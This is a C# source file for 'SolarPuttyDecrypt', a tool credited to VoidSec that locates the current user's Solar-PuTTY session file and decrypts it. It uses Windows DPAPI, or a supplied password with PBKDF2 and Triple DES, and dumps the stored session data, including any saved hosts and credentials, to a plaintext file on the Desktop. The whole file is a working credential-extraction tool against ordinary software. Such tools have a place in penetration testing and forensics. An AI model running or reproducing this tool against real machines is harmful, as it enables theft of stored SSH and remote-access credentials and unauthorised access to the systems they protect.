using System;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using Newtonsoft.Json;

namespace SolarPuttyDecrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0 || args==null)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("SolarPuttyDecrypt now will try to dump local sessions' file, otherwise enter SolarPutty's sessions file path and password.");
                Console.WriteLine("\nUsage: SolarPuttyDecrypt.exe C:\\session.dat pwd123 (use \"\" for empty password)");
                Console.ResetColor();
                //Environment.Exit(1);
            }
            string CurrDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("SolarPutty's Sessions Decrypter by VoidSec");
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Yellow;
            if(args.Length == 0 || args == null)
            {
                string ExportedDirectoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SolarWinds\\FreeTools\\Solar-PuTTY\\");
                string sessionfile = Path.Combine(ExportedDirectoryPath, "data.dat");
                DoImport(sessionfile, null, CurrDir);
            }
            else
            {
                DoImport(args[0], args[1], CurrDir);
            }
            Console.ResetColor();
            Console.WriteLine("-----------------------------------------------------");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] DONE Decrypted file is saved in: " + CurrDir + "\\SolarPutty_sessions_decrypted.txt");
            Console.ResetColor();
        }
        static void DoImport(string dialogFileName, string password, string CurrDir)
        {
            using (FileStream fileStream = new FileStream(dialogFileName, FileMode.Open))
            {
                using (StreamReader streamReader = new StreamReader(fileStream))
                {
                    string text = streamReader.ReadToEnd();
                    try
                    {
                        var text2 = (password == null) ? Crypto.Deob(text) : Crypto.Decrypt(password, text);
                        if (text2 == null)
                        {
                            return;
                        }
                        var obj = JsonConvert.DeserializeObject(text2);
                        var f = JsonConvert.SerializeObject(obj, Formatting.Indented);
                        Console.WriteLine("\n"+f+"\n");
                        using (StreamWriter outputFile = new StreamWriter(Path.Combine(CurrDir, "SolarPutty_sessions_decrypted.txt")))
                        outputFile.WriteLine(f);
                    }
                    catch (CryptographicException ex)
                    {
                        if (ex.Message == "Padding is invalid and cannot be removed.")
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("User entered wrong password for import");
                            Console.ResetColor();
                            Environment.Exit(1);
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine(ex);
                            Console.ResetColor();
                            Environment.Exit(1);
                        }
                        fileStream.Close();
                    }
                    catch (FormatException message)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine(message);
                        Console.ResetColor();
                        fileStream.Close();
                        Environment.Exit(1);
                    }
                }
            }            
        }
    }
}

internal class Crypto
{
    public static string Decrypt(string passPhrase, string cipherText)
    {
        byte[] array = Convert.FromBase64String(cipherText);
        byte[] salt = array.Take(24).ToArray();
        byte[] rgbIV = array.Skip(24).Take(24).ToArray();
        byte[] array2 = array.Skip(48).Take(array.Length - 48).ToArray();
        using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000))
        {
            byte[] bytes = rfc2898DeriveBytes.GetBytes(24);
            using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
                tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform transform = tripleDESCryptoServiceProvider.CreateDecryptor(bytes, rgbIV))
                {
                    using (MemoryStream memoryStream = new MemoryStream(array2))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                        {
                            byte[] array3 = new byte[array2.Length];
                            int count = cryptoStream.Read(array3, 0, array3.Length);
                            memoryStream.Close();
                            cryptoStream.Close();
                            return Encoding.UTF8.GetString(array3, 0, count);
                        }
                    }
                }
            }
        }
    }

    public static string Deob(string cipher)
    {
        byte[] encryptedData = Convert.FromBase64String(cipher);
        try
        {
            byte[] bytes = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
            return Encoding.Unicode.GetString(bytes);
        }
        catch (Exception message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(message);
            Console.ResetColor();
            Environment.Exit(1);
        }
        return string.Empty;
    }
}